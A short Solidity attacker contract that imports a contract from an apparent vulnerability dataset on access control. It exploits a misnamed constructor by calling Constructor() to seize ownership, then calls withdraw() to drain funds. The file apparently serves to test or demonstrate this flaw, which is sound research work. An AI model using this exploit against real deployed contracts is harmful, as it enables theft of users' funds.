 pragma solidity ^0.4.15;

 import "../dataset/access_control/incorrect_constructor_name3.sol";

 contract MissingAttacker{
    
    Missing target;

    constructor(address _target) public {
        target = Missing(_target);
    }

    function attack() public {
        target.Constructor();
    }

    function test() public {
        target.withdraw();
    }

    function () public payable {
    }

 }
